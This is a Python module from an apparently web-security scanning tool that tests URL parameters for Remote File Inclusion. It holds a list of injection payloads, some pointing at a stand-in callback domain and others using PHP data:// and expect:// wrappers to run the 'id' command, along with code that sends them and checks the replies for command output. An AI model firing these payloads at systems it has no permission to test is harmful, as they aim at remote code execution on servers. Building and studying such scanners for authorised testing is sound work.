"""Remote File Inclusion scanner — RFI detection with callback server support."""

import os
import asyncio
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from datetime import datetime, timezone
from typing import Optional

from .config import Finding, Severity, FindingType, ScanConfig
from .http_client import HttpClient


# RFI payloads — use a controlled callback domain
# In production, set WEBBREAKER_CALLBACK_URL or WEBBREAKER_CALLBACK_DOMAIN env var
CALLBACK_DOMAIN = os.environ.get("WEBBREAKER_CALLBACK_DOMAIN", "webbreaker-callback.test")
CALLBACK_URL = os.environ.get("WEBBREAKER_CALLBACK_URL")

RFI_PAYLOADS = [
    f"http://{CALLBACK_DOMAIN}/rfi_test.txt",
    f"http://{CALLBACK_DOMAIN}/rfi_test.php",
    f"https://{CALLBACK_DOMAIN}/rfi_test.txt",
    f"\\\\\\\\{CALLBACK_DOMAIN}/share/rfi_test.txt",  # SMB
    f"ftp://{CALLBACK_DOMAIN}/rfi_test.txt",
    # PHP-specific
    f"php://filter/convert.base64-encode/resource=http://{CALLBACK_DOMAIN}/rfi_test",
    "data://text/plain,<?php system('id'); ?>",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==",
    "expect://id",
    # With null byte
    f"http://{CALLBACK_DOMAIN}/rfi_test.txt%00",
    f"http://{CALLBACK_DOMAIN}/rfi_test.php%00",
]

# Indicators that RFI might be possible (even without callback confirmation)
RFI_INDICATORS = [
    "URL file-access is disabled",  # PHP allow_url_include = Off message
    "failed to open stream",
    "No such file or directory",
    "include()", "require()", "include_once()", "require_once()",
    "fopen()", "file_get_contents()",
]


class RFIScanner:
    """Remote File Inclusion detection."""

    def __init__(self, config: ScanConfig, callback_url: Optional[str] = None):
        self.config = config
        self.client = HttpClient(config)
        self.findings: list[Finding] = []
        self.callback_url = callback_url or CALLBACK_DOMAIN

    def _check_rfi_evidence(self, payload: str, text: str) -> Optional[str]:
        """Check for RFI evidence in the response."""
        # Check for PHP config error messages
        for indicator in RFI_INDICATORS:
            if indicator.lower() in text.lower():
                return f"PHP include/require error detected: contains '{indicator}'"

        # Check for base64 decoded data wrapper output
        if "data://text/plain;base64" in payload:
            import re
            if re.search(r"uid=\d+", text):
                return "Data wrapper executed: command output found"

        # Check for expect wrapper output
        if "expect://" in payload:
            import re
            if re.search(r"uid=\d+", text):
                return "Expect wrapper executed: command output found"

        return None

    async def scan_param(self, url: str, param: str, method: str = "GET") -> list[Finding]:
        findings = []
        parsed = urlparse(url)
        params_dict = parse_qs(parsed.query)

        # Build payloads with actual callback URL if provided
        payloads = []
        if self.callback_url != CALLBACK_DOMAIN:
            # Use real callback server
            payloads = [
                f"http://{self.callback_url}/rfi_test.txt",
                f"https://{self.callback_url}/rfi_test.txt",
                f"\\\\\\\\{self.callback_url}/share/rfi_test.txt",
            ]
        else:
            payloads = RFI_PAYLOADS

        for payload in payloads:
            if method == "GET":
                tp = dict(params_dict)
                tp[param] = [payload]
                test_url = urlunparse(parsed._replace(query=urlencode(tp, doseq=True)))
                resp = await self.client.get(test_url)
            else:
                resp = await self.client.post(url, data={param: payload})

            if not resp:
                continue

            evidence = self._check_rfi_evidence(payload, resp.text)
            if evidence:
                findings.append(Finding(
                    finding_type=FindingType.RFI,
                    severity=Severity.CRITICAL,
                    url=url, parameter=param, payload=payload,
                    evidence=evidence,
                    remediation="Disable allow_url_include in PHP. Never include user-supplied URLs. Use allowlists.",
                    confidence=0.85,
                    timestamp=datetime.now(timezone.utc).isoformat(),
                ))
                break

        self.findings = findings
        return findings

    async def scan_url(self, url: str, params: list[dict] = None) -> list[Finding]:
        all_findings = []
        if params:
            for p in params:
                findings = await self.scan_param(url, p["name"])
                all_findings.extend(findings)
        else:
            parsed = urlparse(url)
            for param_name in parse_qs(parsed.query).keys():
                findings = await self.scan_param(url, param_name)
                all_findings.extend(findings)
        return all_findings

    async def close(self):
        await self.client.close()